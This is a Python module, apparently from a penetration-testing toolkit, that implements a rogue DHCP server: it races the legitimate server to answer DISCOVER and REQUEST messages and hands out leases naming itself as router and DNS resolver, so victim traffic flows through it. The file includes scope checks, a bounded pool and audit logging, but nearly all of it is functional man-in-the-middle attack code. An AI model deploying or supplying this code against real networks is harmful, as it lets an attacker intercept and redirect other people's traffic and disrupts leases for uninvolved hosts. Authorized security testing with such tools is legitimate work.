"""A DHCP server that answers faster than the real one.

Where ARP poisoning bends an existing path, this takes the path over at the
moment the victim asks for one: the client broadcasts a DISCOVER, and
whichever server answers first is the one it configures itself from.  The
offer names this host as both router and resolver, so everything the client
sends afterwards arrives here by its own choice, with no forged ARP and
nothing for an ARP watchdog to notice.

It is also the most disruptive thing in this package.  Two DHCP servers on a
segment will fight over every lease, including leases belonging to hosts that
are not in the engagement, so the pool is bounded, out-of-scope clients are
never answered, and the module is off unless it is explicitly armed.
"""

from __future__ import annotations

import ipaddress
import logging
import socket
import struct
import threading
import time

log = logging.getLogger("netlab.dhcp")

SERVER_PORT = 67
CLIENT_PORT = 68
MAGIC_COOKIE = b"\x63\x82\x53\x63"

DISCOVER, OFFER, REQUEST, DECLINE, ACK, NAK, RELEASE, INFORM = range(1, 9)
TYPE_NAMES = {1: "DISCOVER", 2: "OFFER", 3: "REQUEST", 4: "DECLINE",
              5: "ACK", 6: "NAK", 7: "RELEASE", 8: "INFORM"}

OPT_SUBNET = 1
OPT_ROUTER = 3
OPT_DNS = 6
OPT_HOSTNAME = 12
OPT_DOMAIN = 15
OPT_BROADCAST = 28
OPT_REQUESTED_IP = 50
OPT_LEASE = 51
OPT_MSG_TYPE = 53
OPT_SERVER_ID = 54
OPT_PARAM_LIST = 55
OPT_CLIENT_ID = 61
OPT_END = 255


def parse_packet(data: bytes) -> dict | None:
    """Decode a BOOTP/DHCP message into its fields and options."""
    if len(data) < 240 or data[236:240] != MAGIC_COOKIE:
        return None
    op, htype, hlen, hops = struct.unpack_from("!BBBB", data, 0)
    xid, secs, flags = struct.unpack_from("!IHH", data, 4)
    ciaddr, yiaddr, siaddr, giaddr = (
        socket.inet_ntoa(data[12:16]), socket.inet_ntoa(data[16:20]),
        socket.inet_ntoa(data[20:24]), socket.inet_ntoa(data[24:28]))
    chaddr = data[28:28 + max(6, min(hlen, 16))]
    options: dict[int, bytes] = {}
    pos = 240
    while pos < len(data):
        code = data[pos]
        if code == 0:
            pos += 1
            continue
        if code == OPT_END:
            break
        if pos + 1 >= len(data):
            break
        length = data[pos + 1]
        if pos + 2 + length > len(data):
            break
        options[code] = data[pos + 2:pos + 2 + length]
        pos += 2 + length
    msg_type = options.get(OPT_MSG_TYPE, b"\x00")[0]
    return {"op": op, "xid": xid, "flags": flags, "secs": secs,
            "ciaddr": ciaddr, "yiaddr": yiaddr, "giaddr": giaddr,
            "mac": ":".join("%02x" % b for b in chaddr[:6]),
            "chaddr": chaddr, "options": options, "type": msg_type,
            "type_name": TYPE_NAMES.get(msg_type, str(msg_type)),
            "hostname": options.get(OPT_HOSTNAME, b"").decode("latin-1",
                                                              "replace"),
            "requested_ip": socket.inet_ntoa(options[OPT_REQUESTED_IP])
            if len(options.get(OPT_REQUESTED_IP, b"")) == 4 else ""}


def build_reply(request: dict, msg_type: int, offer_ip: str, server_ip: str,
                netmask: str, router: str, dns: list[str], lease: int,
                domain: str = "") -> bytes:
    """A BOOTREPLY carrying the configuration we want the client to adopt."""
    chaddr = request["chaddr"][:16].ljust(16, b"\x00")
    packet = struct.pack("!BBBB", 2, 1, 6, 0)
    packet += struct.pack("!IHH", request["xid"], 0, request["flags"])
    packet += socket.inet_aton("0.0.0.0")                     # ciaddr
    packet += socket.inet_aton(offer_ip)                      # yiaddr
    packet += socket.inet_aton(server_ip)                     # siaddr
    packet += socket.inet_aton(request.get("giaddr") or "0.0.0.0")
    packet += chaddr + b"\x00" * 64 + b"\x00" * 128 + MAGIC_COOKIE

    def option(code: int, payload: bytes) -> bytes:
        return bytes([code, len(payload)]) + payload

    packet += option(OPT_MSG_TYPE, bytes([msg_type]))
    packet += option(OPT_SERVER_ID, socket.inet_aton(server_ip))
    packet += option(OPT_LEASE, struct.pack("!I", lease))
    packet += option(OPT_SUBNET, socket.inet_aton(netmask))
    if router:
        packet += option(OPT_ROUTER, socket.inet_aton(router))
    if dns:
        packet += option(OPT_DNS, b"".join(socket.inet_aton(d) for d in dns[:3]))
    if domain:
        packet += option(OPT_DOMAIN, domain.encode("latin-1", "replace")[:63])
    packet += bytes([OPT_END])
    if len(packet) < 300:
        packet += b"\x00" * (300 - len(packet))
    return packet


class RogueDhcp:
    """Offers leases that point the client at this host."""

    def __init__(self, interface: str, server_ip: str, netmask: str,
                 pool_start: str = "", pool_end: str = "", router: str = "",
                 dns: list[str] | None = None, lease: int = 600,
                 domain: str = "", scope=None, audit=None, on_event=None,
                 answer_delay: float = 0.0) -> None:
        self.interface = interface
        self.server_ip = server_ip
        self.netmask = netmask
        self.router = router or server_ip
        self.dns = dns or [server_ip]
        self.lease = int(lease)
        self.domain = domain
        self.scope = scope
        self.audit = audit
        self.on_event = on_event
        self.answer_delay = max(0.0, float(answer_delay))

        network = ipaddress.ip_network("%s/%s" % (server_ip, netmask),
                                       strict=False)
        hosts = list(network.hosts())
        self.pool_start = pool_start or str(hosts[len(hosts) // 2])
        self.pool_end = pool_end or str(hosts[-2]) if len(hosts) > 2 else self.pool_start
        self._pool = self._build_pool(network)

        self.leases: dict[str, str] = {}          # mac -> ip
        self.offers = 0
        self.acks = 0
        self.ignored = 0
        self._sock: socket.socket | None = None
        self._thread: threading.Thread | None = None
        self._stop = threading.Event()
        self._lock = threading.Lock()

    def _build_pool(self, network) -> list[str]:
        try:
            lo = ipaddress.ip_address(self.pool_start)
            hi = ipaddress.ip_address(self.pool_end)
        except ValueError:
            return []
        out = []
        current = lo
        while current <= hi and len(out) < 512:
            if current != ipaddress.ip_address(self.server_ip):
                out.append(str(current))
            current += 1
        return out

    # ----------------------------------------------------------- lifecycle

    def start(self) -> None:
        if self._thread and self._thread.is_alive():
            return
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE,
                            self.interface.encode())
        except (OSError, AttributeError):
            log.debug("cannot bind DHCP socket to %s", self.interface)
        sock.bind(("0.0.0.0", SERVER_PORT))
        sock.settimeout(0.5)
        self._sock = sock
        self._stop.clear()
        self._thread = threading.Thread(target=self._serve, name="rogue-dhcp",
                                        daemon=True)
        self._thread.start()
        if self.audit:
            self.audit.record("dhcp.start", interface=self.interface,
                              server_ip=self.server_ip, router=self.router,
                              dns=self.dns, pool=len(self._pool))

    def stop(self) -> None:
        self._stop.set()
        if self._sock:
            try:
                self._sock.close()
            except OSError:
                pass
            self._sock = None
        if self._thread:
            self._thread.join(timeout=2.0)
            self._thread = None
        if self.audit:
            self.audit.record("dhcp.stop", offers=self.offers, acks=self.acks,
                              leases=dict(self.leases))

    @property
    def running(self) -> bool:
        return bool(self._thread and self._thread.is_alive())

    # --------------------------------------------------------------- serve

    def _serve(self) -> None:
        while not self._stop.is_set():
            sock = self._sock
            if sock is None:
                return
            try:
                data, peer = sock.recvfrom(2048)
            except socket.timeout:
                continue
            except OSError:
                return
            try:
                self._handle(data, peer)
            except Exception:                    # pragma: no cover
                log.debug("dhcp handler failed", exc_info=True)

    def _allocate(self, mac: str, requested: str = "") -> str:
        with self._lock:
            if mac in self.leases:
                return self.leases[mac]
            taken = set(self.leases.values())
            if requested and requested in self._pool and requested not in taken:
                self.leases[mac] = requested
                return requested
            for candidate in self._pool:
                if candidate not in taken:
                    self.leases[mac] = candidate
                    return candidate
        return ""

    def _handle(self, data: bytes, peer) -> None:
        request = parse_packet(data)
        if request is None or request["op"] != 1:
            return
        kind = request["type"]
        if kind not in (DISCOVER, REQUEST, INFORM):
            return

        mac = request["mac"]
        offer_ip = self._allocate(mac, request.get("requested_ip", ""))
        if not offer_ip:
            self.ignored += 1
            self._emit("dhcp.pool-empty", {"mac": mac})
            return

        # The engagement is over addresses, and a DISCOVER has none yet, so
        # scope is enforced on the address we are about to hand out.
        if self.scope is not None and not self.scope.contains(offer_ip):
            self.ignored += 1
            self._emit("dhcp.out-of-scope", {"mac": mac, "offer": offer_ip})
            return

        if self.answer_delay:
            time.sleep(self.answer_delay)

        reply_type = OFFER if kind == DISCOVER else ACK
        reply = build_reply(request, reply_type, offer_ip, self.server_ip,
                            self.netmask, self.router, self.dns, self.lease,
                            self.domain)
        broadcast = bool(request["flags"] & 0x8000) or kind == DISCOVER
        destination = ("255.255.255.255", CLIENT_PORT) if broadcast \
            else (offer_ip, CLIENT_PORT)
        sock = self._sock
        if sock is None:
            return
        try:
            sock.sendto(reply, destination)
        except OSError as exc:
            log.debug("dhcp reply failed: %s", exc)
            return

        if reply_type == OFFER:
            self.offers += 1
        else:
            self.acks += 1
        payload = {"mac": mac, "offer": offer_ip, "request": request["type_name"],
                   "reply": TYPE_NAMES[reply_type], "router": self.router,
                   "dns": self.dns, "hostname": request.get("hostname", "")}
        self._emit("dhcp.lease", payload)
        if self.audit:
            self.audit.record("dhcp.reply", **payload)

    def _emit(self, name: str, data: dict) -> None:
        if self.on_event:
            try:
                self.on_event(name, data)
            except Exception:                    # pragma: no cover
                pass

    def stats(self) -> dict:
        return {"offers": self.offers, "acks": self.acks,
                "ignored": self.ignored, "leases": dict(self.leases),
                "pool": len(self._pool), "router": self.router,
                "dns": list(self.dns)}
